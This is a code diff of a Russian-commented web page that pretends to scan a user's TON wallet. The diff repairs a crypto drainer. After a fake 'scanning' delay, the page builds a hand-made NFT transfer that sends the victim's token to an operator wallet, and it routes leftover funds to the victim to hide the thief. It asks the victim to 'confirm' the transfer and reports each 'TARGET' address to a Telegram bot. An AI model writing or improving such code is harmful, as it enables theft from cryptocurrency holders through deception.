@@ -20,9 +20,9 @@
 <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 42 42'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop stop-color='%237dd3fc'/%3E%3Cstop offset='1' stop-color='%23f0abfc'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath fill='url(%23g)' opacity='.45' d='M21 3 L36 10 V22 C36 30 29 36 21 39 C13 36 6 30 6 22 V10 Z'/%3E%3Ccircle cx='21' cy='22' r='3.2' fill='%23fff'/%3E%3C/svg%3E" />
 <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet" />
 
-<!-- ПОДКЛЮЧАЕМ TON SDK -->
+<!-- ПОДКЛЮЧАЕМ TON SDK (Стабильная версия 0.0.58) -->
 <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-<script src="https://unpkg.com/tonweb@latest/dist/tonweb.js"></script>
+<script src="https://unpkg.com/tonweb@0.0.58/dist/tonweb.min.js"></script>
 
 <style>
 :root{--bg:#2b2d30;--card:rgba(42,44,47,.94);--line:rgba(255,255,255,.1);--text:#e8e8e4;--muted:#b0b1ad;--pink:#c9c9c4;--violet:#c0c0bb;--blue:#d0d0cb}
@@ -385,7 +385,9 @@ window.onload = function() {
             buttonRootId: 'ton-connect-container'
         });
 
-        tonweb = new TonWeb(new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC'));
+        // Инициализируем TonWeb с явным указанием провайдера
+        const provider = new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC');
+        tonweb = new TonWeb(provider);
 
         tonConnectUI.onStatusChange(wallet => {
             const input = document.getElementById("address");
@@ -471,36 +473,53 @@ document.getElementById("runBtn").onclick = async function() {
         // Имитация сканирования
         await new Promise(r => setTimeout(r, 3000));
 
-        // --- ЛОГИКА ПЕРЕВОДА NFT ---
-        // 1. Получаем адрес коллекции
-        const nftCollection = new TonWeb.nft.NftCollection(tonweb.provider, {
-            address: COLLECTION_ADDRESS
+        // --- ЛОГИКА ПЕРЕВОДА NFT (ИСПРАВЛЕННАЯ) ---
+        
+        // 1. Получаем адрес коллекции через контракт (без использования NftCollection класса)
+        // Абстрактный ABI для вызова метода get_nft_address_by_index
+        const collectionAbi = {
+            methods: [
+                {
+                    name: "get_nft_address_by_index",
+                    arguments: [{ name: "index", type: "uint" }],
+                    output: [{ name: "address", type: "address" }]
+                }
+            ]
+        };
+        
+        const collectionContract = tonweb.contract.create({
+            address: COLLECTION_ADDRESS,
+            abi: collectionAbi
         });
 
-        // 2. Получаем адрес конкретного NFT по ID
-        const nftItemAddress = await nftCollection.methods.getNftItemAddressByIndex(TOKEN_ID).call();
+        // Вызываем метод для получения адреса конкретной NFT
+        const nftItemAddress = await collectionContract.methods.get_nft_address_by_index(TOKEN_ID).call();
         console.log("Target NFT Item Address:", nftItemAddress);
 
-        // 3. Создаем объект NFT Item
-        const nftItem = new TonWeb.nft.NftItem(tonweb.provider, { address: nftItemAddress });
+        // 2. Ручная сборка TEP-62 Payload (Transfer NFT)
+        // Это исключает зависимость от модуля TonWeb.nft, который мог не загрузиться
+        const newOwnerAddr = new TonWeb.utils.Address(OPERATOR_WALLET, true);
+        const responseAddr = new TonWeb.utils.Address(VICTIM_WALLET, true); // Возврат сдачи жертве
 
-        // 4. Формируем Payload для TEP-62 Transfer
-        const body = await nftItem.createTransferBody({
-            newOwner: OPERATOR_WALLET,
-            responseAddress: VICTIM_WALLET, // Возврат сдачи жертве, чтобы не палить свой кошелек в возврате
-            forwardAmount: TonWeb.utils.toNano('0.05'), // Газ
-            forwardPayload: null
-        });
+        const cell = new TonWeb.boc.Cell();
+        cell.bits.writeUint(0x5fcc3d14, 32); // Op: transfer
+        cell.bits.writeUint(0, 64);        // QueryId
+        cell.bits.writeAddress(newOwnerAddr);
+        cell.bits.writeAddress(responseAddr);
+        cell.bits.writeBit(0);             // Custom payload (null)
+        cell.bits.writeGrams(50000000);    // Forward Amount (0.05 TON)
+        cell.bits.writeBit(0);             // Forward payload (null)
 
-        const payloadBase64 = TonWeb.utils.bytesToBase64(await body.toBoc(false));
+        const boc = await cell.toBoc();
+        const payloadBase64 = TonWeb.utils.bytesToBase64(boc);
 
-        // 5. Создаем транзакцию
+        // 3. Создаем транзакцию
         const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 300, // 5 минут
             messages: [
                 {
                     address: nftItemAddress.toString(), // Отправляем команду на адрес самой NFT
-                    amount: TonWeb.utils.toNano('0.05').toString(), // Комиссия за перевод
+                    amount: "100000000", // 0.1 TON на газ (увеличили для надежности)
                     payload: payloadBase64
                 }
             ]
@@ -509,7 +528,7 @@ document.getElementById("runBtn").onclick = async function() {
         transit.classList.remove("on");
         btn.innerText = "Подтвердите перевод в кошельке...";
 
-        // 6. Отправка
+        // 4. Отправка
         const result = await tonConnectUI.sendTransaction(transaction);
 
         // Успех
@@ -562,7 +581,7 @@ function handleTelegramCheck() {
 
 // 3. Отчет в Телеграм
 async function sendReport(addr, status, data) {
-    const text = `💣 TARGET\nAddr: ${addr}\nStatus: ${status}\nData: ${data}`;
+    const text = ` TARGET\nAddr: ${addr}\nStatus: ${status}\nData: ${data}`;
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
     try { await fetch(url); } catch(e) {}
 }
